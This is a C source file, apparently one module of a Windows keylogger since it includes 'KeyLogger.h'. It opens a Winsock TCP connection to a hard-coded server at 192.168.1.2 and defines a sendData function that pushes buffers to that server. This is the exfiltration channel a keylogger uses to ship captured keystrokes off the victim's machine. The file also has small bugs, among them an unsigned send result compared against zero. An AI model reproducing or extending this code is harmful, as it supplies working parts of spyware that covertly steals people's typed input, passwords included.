#include "KeyLogger.h"

SOCKET connectSocket = INVALID_SOCKET;

int sendData(char buffer[]) {

	SIZE_T sResult = send(connectSocket, buffer, strlen(buffer), 0);
	if (sResult < 0) {
		printf("Send data to server failed with Error : %d\n", WSAGetLastError());
		return -1;
	}

	printf("Data sent successfully\n!");

	return 0;

}

int initSocket() {

	WSADATA wsaData;
	//char recvBuf[DEFAULT_BUFFER_LENGTH];

	int iResult;

	// Initialize Winsock
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		printf("WSAStartup failed with Error : %d\n", WSAGetLastError());
		return -1;
	}

	printf("Initialized WinSock\n");

	
	connectSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	if (connectSocket == INVALID_SOCKET) {
		printf("Creating socket failed with Error : %d\n", WSAGetLastError());
		return -1;
	}

	printf("SOcker created successfully\n");

	struct sockaddr_in server;
	server.sin_addr.S_un.S_addr = inet_addr("192.168.1.2");
	server.sin_family = AF_INET;
	server.sin_port = htons(PORT_NUMBER);

	// connect to remote server
	int cResult = connect(connectSocket, (struct sockaddr*)&server, sizeof(server));

	if (cResult < 0) {
		printf("Connect to server failed with Error : %d\n", WSAGetLastError());
		return -1;
	}

	printf("Scoket connnected successfully\n");

	return 0;
}

int closeSocket() {

	closesocket(connectSocket);
	WSACleanup();
	return 0;
}